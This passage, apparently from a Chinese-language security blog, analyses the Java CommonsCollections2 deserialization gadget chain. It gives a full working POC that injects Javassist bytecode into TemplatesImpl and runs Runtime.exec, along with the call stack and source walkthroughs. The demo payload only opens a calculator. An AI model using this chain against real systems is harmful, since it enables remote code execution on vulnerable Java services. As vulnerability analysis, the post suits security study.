<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);</span><br></pre></td></tr></table></figure>
<p>此外，<strong>LazyMap</strong>链在对<strong>AnnotationInvocationHandler</strong>类的构造中，对第一个传参对象并无注解元素名的要求。</p>
<h1 id="commonscollections2">CommonsCollections2</h1>
<h2 id="影响版本-1">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-2">POC</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2 _tfactory成员变量会在反序列化调用构造方法时自动创建赋值</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>)</span><br><span class="line">                        .getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span></span><br><span class="line">                (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将templates链赋值给queue数组，使其在PriorityQueue的readobject中进行下一步序列化操作，传入siftDown为x，传入compare中为obj1，</span></span><br><span class="line">        Object[] queueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates, <span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queueField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queueField.set(queue, queueArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(queue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparatorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparatorField.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC2&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC2&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-2">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, EvilCat421930353946666</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">129</span>, InvokerTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">64</span>, CC2</span><br></pre></td></tr></table></figure>
<h2 id="前置知识-2">前置知识</h2>
<h3 id="javasist">Javasist</h3>
<blockquote>
<p>是一个处理字节码的类库，能够动态的修改<strong>class</strong>中的字节码。</p>
</blockquote>
<p>需要<strong>maven</strong>依赖。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>附上<strong>Demo</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavassistDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 创建类名</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="comment">// makeClassInitializer 新增静态代码块，insertBefore 在 static 中靠前位置插入</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;south\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="comment">// 写入到对应目录下</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;./&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="classloader">ClassLoader</h3>
<blockquote>
<p>负责将字节码转化成内存中的<strong>Java</strong>类，加载过程中采用双亲委派来实现加载。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoadDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 读取字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz1.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz2</span> <span class="operator">=</span> (Class) method.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Evil&quot;</span>, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        System.out.println(clazz2.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>defineClass</strong>方法是<strong>protected</strong>所以无法直接从外部进行调用，因此需要借助反射来调用。</p>
<p>但是返回的类并不会初始化，只有这个对象显式地调用其构造函数，初始化代码才能被执行，所以需要想办法调用返回的类的构造函数来执行命令。</p>
<h3 id="templatesimpl">TemplatesImpl</h3>
<p><strong>TemplatesImpl</strong>中存在一个内部类<strong>TransletClassLoader</strong>，重写了<strong>defineClass</strong>，且没有对定义域显式声明，因此可以被调用。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用链如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses()</span><br><span class="line">TransletClassLoader.defineClass()</span><br></pre></td></tr></table></figure>
<p>在<strong>getTransletInstance</strong>函数中，如果**_name<strong>为</strong>null<strong>则直接返回</strong>null<strong>，而</strong>_class<strong>为</strong>null<strong>将会进入</strong>defineTransletClasses**方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> Class[] _class = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>defineTransletClasses</strong>函数中，将**_bytecodes<strong>传入了</strong>defineClass<strong>函数，因此其值需要为恶意类的字节码。此外，当</strong>_tfactory**为空时会触发异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TemplatesImpl</span> <span class="keyword">implements</span> <span class="title class_">Templates</span>, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(), _tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]); </span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>综上所述，**_name<strong>不为空，随意传参；</strong>_class<strong>需要为空；</strong>_bytecodes<strong>的参数类型是</strong>byte[][]<strong>因此需要转换一下；最后是给</strong>_tfactory**赋值。</p>
<p>然后要注意的是<strong>TemplatesImpl</strong>类中的<strong>defineTransletClasses</strong>方法在将字节码转换后会判断其是否继承<strong>AbstractTranslet</strong>，因此需要使得恶意类继承<strong>AbstractTranslet</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;System.out.println(\&quot;Test\&quot;);&quot;</span>;</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        constructor.insertBefore(cmd);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;./&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templates, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFieled(templates, clazz, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        setFieled(templates, clazz, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieled(templates, clazz, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieled(templates, clazz, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieled</span><span class="params">(TemplatesImpl templates, Class clas, String fieled, Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_field</span> <span class="operator">=</span> clas.getDeclaredField(fieled);</span><br><span class="line">        _field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _field.set(templates, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用链如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">PriorityQueue.readObject()</span><br><span class="line">PriorityQueue.heapify()</span><br><span class="line">PriorityQueue.siftDown()</span><br><span class="line">PriorityQueue.siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses()</span><br><span class="line">TransletClassLoader.defineClass()</span><br><span class="line">newInstance()</span><br><span class="line">System.out.println(<span class="string">&quot;Test&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="分析-2">分析</h2>
<h3 id="transformingcomparator">TransformingComparator</h3>
<p><strong>TransformingComparator</strong>类的<strong>compare</strong>方法中调用了<strong>transform</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;I&gt;, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3456940356043606220L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;O&gt; decorated;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? <span class="keyword">extends</span> <span class="title class_">O</span>&gt; transformer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">        <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(I obj1, I obj2)</span> &#123;</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span 